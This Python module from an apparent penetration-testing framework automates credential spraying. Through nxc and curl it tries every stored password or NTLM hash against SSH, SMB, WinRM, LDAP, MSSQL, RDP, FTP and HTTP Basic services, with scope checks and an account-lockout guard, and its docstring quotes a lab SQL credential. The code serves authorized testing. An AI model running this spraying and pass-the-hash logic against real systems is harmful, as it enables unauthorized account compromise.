"""Credential spraying — the "when a new protocol connects, try every known
credential" fix.

Fixes the pathology where ``yhwach_add_cred sa/Acme-SQL-SA!2026`` stored
the cred but never tried it against 10.0.0.30:1433, so the dbhost01
foothold sat available-but-untaken for hours. Now:

  * On ``add_cred`` — the sprayer is invoked with the new cred × every
    existing service whose protocol matches.
  * On new service (from ``ingest_nmap``) — the sprayer is invoked with the
    new service × every vault cred whose kind can speak that protocol.
  * On demand — ``yhwach_spray`` runs the full matrix.

Every attempt (success OR fail) is written to ``credential_access`` so we
don't retry the same (cred, service) pair repeatedly; a per-service backoff
also skips a service after N consecutive failures in a short window.

Design decisions
----------------

* **No new table.** ``credential_access`` already dedupes by
  (cred, host, proto, port) and ranks fail<success<admin — the sprayer just
  writes `result='fail'` for negative attempts, so the vault matrix stays
  the single source of truth.
* **Adapters are subprocess wrappers around nxc / curl / smbclient.** They
  return a normalised :class:`SprayResult` regardless of tool. The adapter
  layer is small and predictable; adding an FTP or an HTTP-form adapter is
  <30 lines.
* **Every adapter has a 12-second timeout by default.** A stuck protocol
  can never wedge the batch — the sprayer keeps going.
* **Domain vs local is auto-tried for SMB/WinRM.** For each (u, p) pair the
  sprayer runs both a domain bind (``example.corp\\user``) and a local
  bind (``--local-auth``) so the operator doesn't have to double-enter the
  cred with a different flag.
* **Read-only by default.** Spray never runs code on the target — even on a
  successful auth the adapter closes without executing commands. Execution
  is an explicit operator step via the normal MCP tools.
* **Account-lockout guard.** Before any domain-auth attempt (smb/winrm/ldap/
  mssql/rdp) the sprayer reads the observed ``password_policy`` and refuses the
  attempt that would reach ``lockout_threshold`` for that account inside the
  observation window — the one move that burns an AD engagement. Deterministic,
  never delegated to the brain; ``--force`` overrides.

Public API
----------

``spray_cred(conn, eid, cred_id, **opts) -> SprayBatch``
    Spray one cred × every matching service.

``spray_service(conn, eid, service_id, **opts) -> SprayBatch``
    Spray every matching vault cred × one service.

``spray_all(conn, eid, host_ip=None, protocol=None) -> SprayBatch``
    Full matrix, optionally filtered.

``PROTOCOL_MATCHERS`` maps kind → set(protocol) so the caller doesn't have
to reason about "is this cred usable against this service". The list is
authoritative — every adapter must live under a protocol here.
"""
from __future__ import annotations

import re
import shutil
import sqlite3
import subprocess
from dataclasses import dataclass, field
from datetime import UTC, datetime, timedelta

# ---------------------------------------------------------------------------
# Protocol matchers — kind → protocols this credential can attempt.
# ---------------------------------------------------------------------------

# What a service must "look like" (by port and/or product) to be a candidate
# for a given protocol. The matcher can key on port alone, product alone, or
# both. First match wins.
_SERVICE_PROTOCOLS: dict[str, dict] = {
    "ssh":   {"ports": {22, 2222}, "products": ("openssh", "ssh", "dropbear")},
    "smb":   {"ports": {445, 139}, "products": ("smb", "samba", "cifs", "netbios")},
    "winrm": {"ports": {5985, 5986}, "products": ("winrm", "wsman")},  # WinRM: port-identified; 'http' would mis-grab every web server
    "ldap":  {"ports": {389}, "products": ("ldap", "openldap", "active directory")},
    "ldaps": {"ports": {636}, "products": ("ldaps", "ldap")},
    "mssql": {"ports": {1433}, "products": ("mssql", "microsoft sql", "sql server")},
    "rdp":   {"ports": {3389}, "products": ("rdp", "ms-wbt-server", "terminal")},
    "ftp":   {"ports": {21}, "products": ("ftp", "vsftpd", "proftpd", "pure-ftpd")},
    "http-basic": {"ports": {80, 8080, 8000, 8888, 3000, 5000}, "products": ("nginx", "apache", "iis", "http")},
}

# Which cred kinds can attempt which protocols. A password can attempt every
# credentialed protocol; an NTLM hash restricts to pass-the-hash surfaces;
# ssh_key/api_key/dpapi/kerberos have narrower reach. Keep this conservative
# — an adapter that isn't listed here is never called.
PROTOCOL_MATCHERS: dict[str, set[str]] = {
    "password": {"ssh", "smb", "winrm", "ldap", "ldaps", "mssql", "rdp", "ftp", "http-basic"},
    "ntlm":     {"smb", "winrm", "mssql"},   # pass-the-hash surfaces; PtH over ldap/ldaps is unreliable
    "ssh_key":  {"ssh"},
    # api_key / token are NOT sprayed: blindly sending a bearer token to every
    # web root in memory ships a client secret to arbitrary hosts and treats any
    # 200 on `/` as a valid login. Hold them in the vault; the operator decides
    # where a token is used. (Dedicated API probing is a separate, targeted move.)
    "api_key":  set(),
    "token":    set(),
    "kerberos": set(),   # tickets need dedicated tooling; spray adapter TBD
    "dpapi":    set(),   # offline blob, not a live-auth cred
}

# Consecutive fails against ONE service before it's short-circuited for the
# rest of a batch. Prevents 25 nxc calls into a firewalled port.
_SERVICE_FAIL_BACKOFF = 4

# Per-attempt timeout (seconds). Killed hard; the batch keeps going.
_ADAPTER_TIMEOUT = 12


# ---------------------------------------------------------------------------
# Result types
# ---------------------------------------------------------------------------


@dataclass
class SprayResult:
    """One (cred, service) attempt outcome, normalised across adapters."""
    credential_id: int
    service_id: int
    host_id: int
    ip: str
    port: int
    protocol: str
    identifier: str
    result: str           # 'success' | 'admin' | 'fail' | 'error' | 'skipped'
    detail: str = ""


@dataclass
class SprayBatch:
    """A batch of attempts + the summary the MCP tool prints back."""
    attempts: list[SprayResult] = field(default_factory=list)
    hits: list[SprayResult] = field(default_factory=list)
    admins: list[SprayResult] = field(default_factory=list)
    skipped: int = 0
    errors: int = 0
    blocked: int = 0   # attempts held back by the lockout guard (never sent)

    def summarize(self) -> str:
        n = len(self.attempts)
        if n == 0:
            return "spray: nothing to do (0 (cred × service) candidates)"
        parts = [f"spray: {n} attempt(s)",
                 f"{len(self.hits)} hit", f"{len(self.admins)} admin",
                 f"{self.errors} error", f"{self.skipped} skipped"]
        if self.blocked:
            parts.append(f"{self.blocked} lockout-blocked")
        return " · ".join(parts)


# ---------------------------------------------------------------------------
# Candidate selection (pure SQL — no adapters called here)
# ---------------------------------------------------------------------------


def _protocol_for(port: int, product: str | None) -> str | None:
    """Best-effort protocol tag for a service row.

    Port wins over product because ports are more reliable than nmap's -sV
    banner heuristics (e.g. WinRM shows as 'http'). Falls back to product
    substring match for services on non-default ports.
    """
    product_l = (product or "").lower()
    # Prefer specific ports (mssql 1433) over generic http ports (winrm 5985).
    for proto in ("mssql", "rdp", "ldaps", "ldap", "winrm", "smb", "ssh", "ftp", "http-basic"):
        spec = _SERVICE_PROTOCOLS[proto]
        if port in spec["ports"]:
            return proto
    for proto, spec in _SERVICE_PROTOCOLS.items():
        if product_l and any(sig in product_l for sig in spec["products"]):
            return proto
    return None


def _candidate_services(
    conn: sqlite3.Connection,
    engagement_id: int,
    *,
    host_ip: str | None = None,
    protocol: str | None = None,
) -> list[sqlite3.Row]:
    """Rows: (service.id, host_id, ip, port, proto_service, product) for every
    in-scope service that can host at least one supported protocol.

    ``proto_service`` is the row's tcp/udp; we compute the *application*
    protocol via :func:`_protocol_for` and filter after fetch.
    """
    q = (
        "SELECT s.id AS service_id, s.host_id, h.ip, s.port, s.proto AS proto_service, "
        "s.product FROM service s JOIN host h ON h.id = s.host_id "
        "WHERE h.engagement_id = ?"
    )
    params: list = [engagement_id]
    if host_ip:
        q += " AND h.ip = ?"
        params.append(host_ip)
    rows = conn.execute(q, params).fetchall()
    # Never spray a host outside the engagement scope. Use the typed matcher so
    # exclude rows win and hostname/wildcard scopes don't degrade to "allow all":
    # a host can enter memory from a pasted nmap file that straddles the
    # boundary, and the sprayer must not authenticate to it.
    from yhwach import scope as yhscope

    rows = [r for r in rows if yhscope.assert_target(conn, engagement_id, r["ip"])[0]]
    if protocol:
        rows = [r for r in rows if _protocol_for(r["port"], r["product"]) == protocol]
    else:
        rows = [r for r in rows if _protocol_for(r["port"], r["product"]) is not None]
    return rows


def _candidate_creds(
    conn: sqlite3.Connection,
    engagement_id: int,
    *,
    cred_id: int | None = None,
    protocol: str | None = None,
) -> list[sqlite3.Row]:
    # A client-provided (assumed-breach / test) credential is NEVER sprayed:
    # the operator was given it to use, not to validate against the estate.
    q = ("SELECT id, identifier, secret, kind FROM credential "
         "WHERE engagement_id = ? AND COALESCE(provenance,'discovered') != 'provided'")
    params: list = [engagement_id]
    if cred_id is not None:
        # An explicitly named cred may be sprayed even if spray_policy='manual'
        # (the operator chose it deliberately); the sweep below never includes one.
        q += " AND id = ?"
        params.append(cred_id)
    else:
        # Dumped hashes / cracked passwords (spray_policy='manual') are excluded
        # from the broad sweep — spraying a dumped domain hash estate-wide is the
        # loud, lockout-risking move this guard exists to prevent (G2c).
        q += " AND COALESCE(spray_policy,'auto') != 'manual'"
    rows = conn.execute(q, params).fetchall()
    if protocol is None:
        # Any cred whose kind is in the matcher (kerberos/dpapi filtered out).
        return [r for r in rows if PROTOCOL_MATCHERS.get(r["kind"], set())]
    return [r for r in rows if protocol in PROTOCOL_MATCHERS.get(r["kind"], set())]


def _already_attempted(
    conn: sqlite3.Connection,
    credential_id: int,
    host_id: int,
    port: int,
    protocol: str,
) -> str | None:
    """Return the prior result string, or None if never attempted.

    We never reattempt a (cred, service) pair — the same input produces the
    same output. Operator can force by calling ``yhwach_spray --force`` (not
    wired here; the MCP tool passes a filter down).
    """
    row = conn.execute(
        "SELECT result FROM credential_access WHERE credential_id=? AND host_id=? "
        "AND IFNULL(port,-1) = ? AND IFNULL(proto,'') = ?",
        (credential_id, host_id, port, protocol),
    ).fetchone()
    return row["result"] if row else None


# Protocols that authenticate against a (domain) account and therefore feed the
# account-lockout counter. ssh/ftp/http-basic are typically local/service auth
# and are deliberately excluded from the domain-lockout guard.
_DOMAIN_LOCKOUT_PROTOS = frozenset({"smb", "winrm", "ldap", "ldaps", "mssql", "rdp"})


def _lockout_policy(
    conn: sqlite3.Connection, engagement_id: int, host_id: int,
) -> tuple[int | None, int | None]:
    """(threshold, window_min) for the account-lockout policy in effect for domain
    auth against `host_id`, or (None, None) if none is known or lockout is disabled.

    Only rows with a real lockout (threshold > 0) count — `lockout_threshold = 0`
    means "no lockout", so spraying is unconstrained. A host-specific policy wins
    over a domain-wide one; newest wins on a tie."""
    row = conn.execute(
        "SELECT lockout_threshold t, lockout_window_min w FROM password_policy "
        "WHERE engagement_id=? AND COALESCE(lockout_threshold,0) > 0 "
        "ORDER BY (host_id=?) DESC, id DESC LIMIT 1",
        (engagement_id, host_id),
    ).fetchone()
    return (row["t"], row["w"]) if row else (None, None)


def _recent_account_fails(
    conn: sqlite3.Connection, engagement_id: int, identifier: str,
    window_min: int | None,
) -> int:
    """Bad-password attempts recorded against this ACCOUNT (by identifier) across
    the domain-lockout protocols — the badPwdCount proxy. Windowed to the policy's
    observation window when known (lockout counters reset after it); all-time and
    thus more conservative otherwise. Lockout is domain-wide, so this is not scoped
    to one host."""
    protos = tuple(_DOMAIN_LOCKOUT_PROTOS)
    ph = ",".join("?" * len(protos))
    params: list = [engagement_id, identifier, *protos]
    since = ""
    if window_min and window_min > 0:
        cutoff = (datetime.now(UTC) - timedelta(minutes=window_min)).strftime(
            "%Y-%m-%dT%H:%M:%SZ")
        since = " AND ca.checked_at >= ?"
        params.append(cutoff)
    row = conn.execute(
        "SELECT COUNT(*) n FROM credential_access ca "
        "JOIN credential c ON c.id=ca.credential_id "
        f"WHERE ca.engagement_id=? AND LOWER(c.identifier)=LOWER(?) "
        f"AND ca.result='fail' AND ca.proto IN ({ph}){since}",
        params,
    ).fetchone()
    return int(row["n"]) if row else 0


# ---------------------------------------------------------------------------
# Adapters — one per protocol. Return a normalised SprayResult.
# ---------------------------------------------------------------------------


def _run(cmd: list[str], *, timeout: int = _ADAPTER_TIMEOUT) -> tuple[int, str]:
    """Run a subprocess with a hard timeout. Returns (rc, combined_output).

    Errors don't raise — a spray batch shouldn't die because nxc isn't on
    PATH; the failure becomes result='error' on the specific attempt.
    """
    try:
        p = subprocess.run(
            cmd, capture_output=True, text=True,
            timeout=timeout, check=False,
        )
        return p.returncode, (p.stdout or "") + (p.stderr or "")
    except FileNotFoundError:
        return 127, f"tool not found: {cmd[0]}"
    except subprocess.TimeoutExpired:
        return 124, f"timeout after {timeout}s: {' '.join(cmd)}"


def _nxc(protocol: str, ip: str, user: str, secret: str,
         *, port: int | None = None, local_auth: bool = False,
         kind: str = "password") -> tuple[str, str]:
    """Common nxc invocation. Returns ('success'|'admin'|'fail'|'error', detail).

    An ``ntlm`` credential is passed as a pass-the-hash (``-H``), never as a
    plaintext password (``-p``) — sending a hash as a password guarantees a
    failure, burns the account's lockout budget, and caches a false 'fail'
    that hides working PtH access.
    """
    if not shutil.which("nxc"):
        return "error", "nxc not on PATH"
    if kind == "ntlm":
        cmd = ["nxc", protocol, ip, "-u", user, "-H", secret]
    else:
        cmd = ["nxc", protocol, ip, "-u", user, "-p", secret]
    if port is not None and protocol in ("winrm", "smb", "mssql", "rdp"):
        cmd += ["--port", str(port)]
    if local_auth:
        cmd.append("--local-auth")
    rc, out = _run(cmd)
    # nxc marks a positive auth with "[+]" on the SMB/WinRM/... line;
    # "(Pwn3d!)" marks local/domain admin. STATUS_LOGON_FAILURE = fail.
    if "(Pwn3d!)" in out:
        return "admin", "nxc: Pwn3d!"
    if re.search(r"\[\+\]", out) and "STATUS_" not in out:
        return "success", "nxc: [+]"
    if "STATUS_LOGON_FAILURE" in out or "STATUS_ACCOUNT_DISABLED" in out or "STATUS_ACCESS_DENIED" in out:
        return "fail", "nxc: logon_failure"
    if rc == 124:
        return "error", out.strip()[:120]
    if rc == 127:
        return "error", "nxc missing"
    return "fail", (out.strip().splitlines()[-1] if out.strip() else "no auth")


def _adapter_ssh(ip: str, user: str, secret: str, kind: str,
                 port: int) -> tuple[str, str]:
    if kind == "ssh_key":
        # Live key-auth attempts need a filesystem path; the operator does
        # ssh_key spraying manually today. Mark as skipped so it doesn't
        # register a false 'fail'.
        return "skipped", "ssh_key adapter: manual (need key path)"
    return _nxc("ssh", ip, user, secret, port=port)


def _adapter_smb(ip: str, user: str, secret: str, kind: str,
                 port: int) -> tuple[str, str]:
    # For SMB/WinRM/LDAP the domain vs local dimension matters. We try
    # domain-auth first (the common case on this lab's example.corp),
    # then --local-auth on a fail — the results are OR'd (any success wins).
    r, d = _nxc("smb", ip, user, secret, port=port, local_auth=False, kind=kind)
    if r in ("success", "admin"):
        return r, d
    r2, d2 = _nxc("smb", ip, user, secret, port=port, local_auth=True, kind=kind)
    if r2 in ("success", "admin"):
        return r2, d2 + " (local-auth)"
    # Both failed — surface the more specific error.
    return r, d


def _adapter_winrm(ip: str, user: str, secret: str, kind: str,
                   port: int) -> tuple[str, str]:
    r, d = _nxc("winrm", ip, user, secret, port=port, local_auth=False, kind=kind)
    if r in ("success", "admin"):
        return r, d
    r2, d2 = _nxc("winrm", ip, user, secret, port=port, local_auth=True, kind=kind)
    if r2 in ("success", "admin"):
        return r2, d2 + " (local-auth)"
    return r, d


def _adapter_ldap(ip: str, user: str, secret: str, kind: str,
                  port: int) -> tuple[str, str]:
    return _nxc("ldap", ip, user, secret, port=port)


def _adapter_mssql(ip: str, user: str, secret: str, kind: str,
                   port: int) -> tuple[str, str]:
    # MSSQL: try SQL auth (--local-auth) FIRST — that's what got the
    # sa:Acme-SQL-SA!2026 win. Then domain auth as a fallback.
    r, d = _nxc("mssql", ip, user, secret, port=port, local_auth=True, kind=kind)
    if r in ("success", "admin"):
        return r, d + " (sql-auth)"
    r2, d2 = _nxc("mssql", ip, user, secret, port=port, local_auth=False, kind=kind)
    if r2 in ("success", "admin"):
        return r2, d2
    return r, d


def _adapter_rdp(ip: str, user: str, secret: str, kind: str,
                 port: int) -> tuple[str, str]:
    return _nxc("rdp", ip, user, secret, port=port)


def _adapter_ftp(ip: str, user: str, secret: str, kind: str,
                 port: int) -> tuple[str, str]:
    return _nxc("ftp", ip, user, secret, port=port)


def _adapter_http_basic(ip: str, user: str, secret: str, kind: str,
                        port: int) -> tuple[str, str]:
    """HTTP Basic on a WWW-Authenticate: Basic realm. Curl probe.

    Only password creds reach here (api_key/token are not sprayed — see
    PROTOCOL_MATCHERS). A 200 counts as success ONLY when an unauthenticated
    request to the same URL was 401/403; otherwise a public homepage would
    "validate" every password in the vault.
    """
    if not shutil.which("curl"):
        return "error", "curl not on PATH"
    scheme = "https" if port in (443, 8443) else "http"
    url = f"{scheme}://{ip}:{port}/"

    def _code(args: list[str]) -> str:
        _rc, out = _run(
            ["curl", "-sk", "-o", "/dev/null", "-w", "%{http_code}", "--max-time", "8", *args, url]
        )
        return out.strip().split("\n")[-1]

    baseline = _code([])
    if baseline not in ("401", "403"):
        # No Basic-auth challenge on this root — a 200 here proves nothing.
        return "skipped", f"no basic-auth challenge (unauth HTTP {baseline})"
    code = _code(["-u", f"{user}:{secret}"])
    if code in ("200", "201", "204"):
        return "success", f"HTTP {code} (baseline {baseline})"
    return "fail", f"HTTP {code}"


_ADAPTERS = {
    "ssh":         _adapter_ssh,
    "smb":         _adapter_smb,
    "winrm":       _adapter_winrm,
    "ldap":        _adapter_ldap,
    "ldaps":       _adapter_ldap,   # LDAPS uses the same nxc backend
    "mssql":       _adapter_mssql,
    "rdp":         _adapter_rdp,
    "ftp":         _adapter_ftp,
    "http-basic":  _adapter_http_basic,
}


# ---------------------------------------------------------------------------
# The orchestrator
# ---------------------------------------------------------------------------


def _now() -> str:
    return datetime.now(UTC).replace(microsecond=0).isoformat()


def _run_matrix(
    conn: sqlite3.Connection,
    engagement_id: int,
    creds: list[sqlite3.Row],
    services: list[sqlite3.Row],
    *,
    dry_run: bool = False,
    force: bool = False,
) -> SprayBatch:
    """Cross every (cred, service) pair, respecting cred-kind × protocol match.

    Writes results into ``credential_access`` (fail rows included) so the
    matrix is idempotent — a second call re-spraying the same (cred,
    service) will short-circuit unless ``force=True``.
    """
    from yhwach import db as yhdb  # local import to break a hypothetical cycle

    batch = SprayBatch()
    # Per-service consecutive-fail counter for backoff.
    fail_streaks: dict[int, int] = {}

    for svc in services:
        proto = _protocol_for(svc["port"], svc["product"])
        if proto is None:
            continue
        adapter = _ADAPTERS.get(proto)
        for cred in creds:
            if proto not in PROTOCOL_MATCHERS.get(cred["kind"], set()):
                continue
            # Backoff — skip after N consecutive fails in this run.
            if fail_streaks.get(svc["service_id"], 0) >= _SERVICE_FAIL_BACKOFF:
                batch.skipped += 1
                batch.attempts.append(SprayResult(
                    credential_id=cred["id"], service_id=svc["service_id"],
                    host_id=svc["host_id"], ip=svc["ip"], port=svc["port"],
                    protocol=proto, identifier=cred["identifier"],
                    result="skipped", detail="backoff after consecutive fails",
                ))
                continue
            # Already tried? Skip unless --force.
            prior = _already_attempted(
                conn, cred["id"], svc["host_id"], svc["port"], proto,
            )
            if prior is not None and not force:
                batch.attempts.append(SprayResult(
                    credential_id=cred["id"], service_id=svc["service_id"],
                    host_id=svc["host_id"], ip=svc["ip"], port=svc["port"],
                    protocol=proto, identifier=cred["identifier"],
                    result=prior, detail="cached from prior attempt",
                ))
                if prior in ("success", "admin"):
                    batch.hits.append(batch.attempts[-1])
                    if prior == "admin":
                        batch.admins.append(batch.attempts[-1])
                continue

            # Lockout guard — the one move that burns an AD engagement. Never make
            # the attempt that would trip an account's lockout threshold. Domain-
            # auth protocols only; only when a real policy is known; --force
            # overrides. The blocked attempt is NOT sent and NOT cached, so once
            # the observation window passes the account naturally re-opens.
            if proto in _DOMAIN_LOCKOUT_PROTOS and not force:
                thr, win = _lockout_policy(conn, engagement_id, svc["host_id"])
                if thr:
                    # Fails are cached to credential_access as they happen (same
                    # transaction), so this count already includes attempts made
                    # earlier in THIS run — no separate in-run counter needed.
                    effective = _recent_account_fails(
                        conn, engagement_id, cred["identifier"], win,
                    )
                    if effective >= thr - 1:
                        batch.blocked += 1
                        batch.attempts.append(SprayResult(
                            credential_id=cred["id"], service_id=svc["service_id"],
                            host_id=svc["host_id"], ip=svc["ip"], port=svc["port"],
                            protocol=proto, identifier=cred["identifier"],
                            result="blocked",
                            detail=(f"lockout guard: {effective}/{thr} bad attempts on "
                                    f"'{cred['identifier']}' within the window"),
                        ))
                        continue

            if dry_run or adapter is None:
                res, detail = "skipped", (
                    "dry_run" if dry_run else f"no adapter for {proto}"
                )
            else:
                res, detail = adapter(
                    svc["ip"], cred["identifier"], cred["secret"] or "",
                    cred["kind"], svc["port"],
                )

            r = SprayResult(
                credential_id=cred["id"], service_id=svc["service_id"],
                host_id=svc["host_id"], ip=svc["ip"], port=svc["port"],
                protocol=proto, identifier=cred["identifier"],
                result=res, detail=detail,
            )
            batch.attempts.append(r)

            if res in ("success", "admin"):
                batch.hits.append(r)
                if res == "admin":
                    batch.admins.append(r)
                fail_streaks[svc["service_id"]] = 0
                yhdb.mark_credential_validated(
                    conn, engagement_id, cred["id"], svc["host_id"],
                    port=svc["port"], proto=proto, service_kind=proto,
                    result=res, source="autospray",
                )
            elif res == "fail":
                fail_streaks[svc["service_id"]] = fail_streaks.get(
                    svc["service_id"], 0,
                ) + 1
                # Cache the fail so we don't reattempt this pair.
                yhdb.record_cred_access(
                    conn, engagement_id, cred["id"], svc["host_id"],
                    port=svc["port"], proto=proto, service_kind=proto,
                    result="fail", source="autospray",
                )
            elif res == "error":
                batch.errors += 1
                # Errors DON'T count as fails (transient tooling issues) — a
                # later invocation should retry. Don't cache in DB.
            elif res == "skipped":
                batch.skipped += 1

    # Activity ledger (I05): one bounded summary row per spray run — yhwach
    # originated this traffic. Per-attempt detail (incl. cached/blocked) already
    # lives in credential_access, so a per-attempt copy here would grow without
    # bound on every autospray re-run.
    if batch.attempts and not dry_run:
        sent = sum(1 for a in batch.attempts
                   if a.result in ("success", "admin", "fail", "error"))
        yhdb.add_activity(
            conn, engagement_id, actor="yhwach", action="spray",
            target=f"{len(creds)} cred(s) x {len(services)} service(s)",
            result=(f"{len(batch.hits)} hit / {sent} sent / "
                    f"{batch.blocked} blocked / {batch.skipped} skipped"),
        )

    return batch


def spray_cred(
    conn: sqlite3.Connection,
    engagement_id: int,
    credential_id: int,
    *,
    host_ip: str | None = None,
    protocol: str | None = None,
    dry_run: bool = False,
    force: bool = False,
) -> SprayBatch:
    """Spray ONE credential against every matching service in the engagement.

    Hook target for ``add_cred``: as soon as a new cred lands, this fires so
    the operator doesn't have to remember to run yhwach_spray manually.
    """
    creds = _candidate_creds(
        conn, engagement_id, cred_id=credential_id, protocol=protocol,
    )
    services = _candidate_services(
        conn, engagement_id, host_ip=host_ip, protocol=protocol,
    )
    return _run_matrix(
        conn, engagement_id, creds, services, dry_run=dry_run, force=force,
    )


def spray_service(
    conn: sqlite3.Connection,
    engagement_id: int,
    service_id: int,
    *,
    dry_run: bool = False,
    force: bool = False,
) -> SprayBatch:
    """Spray every vault cred against ONE service.

    Hook target for ``ingest_nmap`` seeing a new service — the operator's
    known-good credentials get tried against the newly discovered port the
    same turn.
    """
    svc_rows = conn.execute(
        "SELECT s.id AS service_id, s.host_id, h.ip, s.port, s.proto AS proto_service, "
        "s.product FROM service s JOIN host h ON h.id = s.host_id "
        "WHERE h.engagement_id = ? AND s.id = ?",
        (engagement_id, service_id),
    ).fetchall()
    if not svc_rows:
        return SprayBatch()
    proto = _protocol_for(svc_rows[0]["port"], svc_rows[0]["product"])
    creds = _candidate_creds(conn, engagement_id, protocol=proto)
    return _run_matrix(
        conn, engagement_id, creds, svc_rows, dry_run=dry_run, force=force,
    )


def spray_all(
    conn: sqlite3.Connection,
    engagement_id: int,
    *,
    host_ip: str | None = None,
    protocol: str | None = None,
    dry_run: bool = False,
    force: bool = False,
) -> SprayBatch:
    """Full matrix: every vault cred × every matching service. Optional filters."""
    creds = _candidate_creds(conn, engagement_id, protocol=protocol)
    services = _candidate_services(
        conn, engagement_id, host_ip=host_ip, protocol=protocol,
    )
    return _run_matrix(
        conn, engagement_id, creds, services, dry_run=dry_run, force=force,
    )
